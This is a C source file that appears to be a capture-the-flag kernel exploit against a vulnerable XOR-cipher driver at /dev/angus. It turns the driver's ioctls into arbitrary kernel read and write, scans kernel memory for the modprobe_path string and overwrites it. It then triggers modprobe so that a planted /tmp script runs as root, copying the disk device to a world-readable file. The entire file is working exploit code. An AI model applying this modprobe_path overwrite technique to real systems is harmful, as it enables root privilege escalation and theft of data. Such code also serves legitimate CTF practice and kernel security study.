#define _GNU_SOURCE

#include <sys/socket.h>
#include <netinet/in.h>
#include <stdio.h>
#include <fcntl.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <stdint.h>
#include <inttypes.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/prctl.h>

typedef uint64_t u64;

#define info(fmt, ...) fprintf(stderr, "[+] " fmt "\n", ##__VA_ARGS__)
#define IS_PRINTABLE(c) ((c) > 31 && (c) < 127)

void hexdump(const void *buffer, size_t size) {
    const unsigned char *data = buffer;

    for (size_t i = 0; i < size; i++) {
        printf("%02x ", data[i]);
        if ((i % 16) == 15 || i == size - 1) {
            printf(" |");
            for (size_t j = i - (i % 16); j <= i; j++)
                putchar(IS_PRINTABLE(data[j]) ? data[j] : '.');
            puts("|");
        }
    }
}

void dump(const void *buffer, size_t count) {
    const u64 *data = buffer;

    for (size_t i = 0; i < count; i++)
        printf("[%zu] 0x%016" PRIx64 "\n", i, data[i]);
}

void fatal(const char *message) {
    perror(message);
    exit(EXIT_FAILURE);
}

#define CMD_INIT    0x13370001
#define CMD_SETKEY  0x13370002
#define CMD_SETDATA 0x13370003
#define CMD_GETDATA 0x13370004
#define CMD_ENCRYPT 0x13370005
#define CMD_DECRYPT 0x13370006

typedef struct {
  char *ptr;
  size_t len;
} request_t;

typedef struct {
  char *key;
  char *data;
  size_t keylen;
  size_t datalen;
} XorCipher;

void set_proc_name(const char *name) {
    int ret = prctl(PR_SET_NAME, name, 0, 0, 0);
    if (ret) fatal("prctl");
}

XorCipher *ctx = NULL;
int fd;

int arr(char *dst, char *src, size_t len) {
    ctx->data = src;
    ctx->datalen = len;
    
    request_t req = {0};
    req.ptr = dst;
    req.len = len;
    int rc = ioctl(fd, CMD_GETDATA, &req);
    // if (rc < 0) fatal("ioctl CMD_GETDATA");
    return rc;
}

void arw(char *dst, char *src, size_t len) {
    char *t = malloc(0x1000);
    arr(t, dst, len);
    
    for (size_t i = 0; i < len; ++i)
        t[i] ^= src[i];

    ctx->key = t;
    ctx->keylen = len;
    ctx->data = dst;
    ctx->datalen = len;

    request_t req = {0};
    int rc = ioctl(fd, CMD_ENCRYPT, &req);
    if (rc < 0) fatal("ioctl arw");
}

int main(void) {
    info("start exp");
    int rc;
    
    fd = open("/dev/angus", O_RDWR);
    if (fd < 0) fatal("open dev");

    ctx = mmap((void*)0,
                0x1000,
                PROT_READ | PROT_WRITE | PROT_EXEC,
                MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED | MAP_POPULATE,
                -1,
                0);
    
    u64 sz = 0x1000000;
    char *buf = calloc(1, sz);
    if (!buf) perror("calloc");

    info("scanning memory");

    u64 base = 0xffffffff00000000;
    char *modprobe = NULL;
    u64 addr;
    
    for (size_t i = 0; i <= 0xfff; ++i) {
        addr = base + (i << 20) + 0x37e60;    
        rc = arr(buf, (char*)addr, 14);    
        if (rc != 0) continue;

        if (memcmp(buf, "/sbin/modprobe", 14) == 0) {
            modprobe = (char*)addr;
            break;
        }
    }

    if (!modprobe) {
        info("modprobe not found");
        return 1;
    }

    system("echo '#!/bin/sh\ncp /dev/vda /tmp/flag\nchmod 777 /tmp/flag' > /tmp/xxxxxxxxx"); 
    system("chmod +x /tmp/xxxxxxxxx");

    arw((char*)addr, "/tmp/xxxxxxxxx", 14);

    // we can choose to use socket or binfmt path
    socket(AF_UNSPEC, SOCK_DGRAM, 0);
        
    // system("echo -ne '\\xff\\xff\\xff\\xff' > /tmp/dummy");
    // system("chmod +x /tmp/dummy");
    // system("/tmp/dummy");

    system("cat /tmp/flag");

    info("end exp");

    getc(stdin);

    return 0;
}
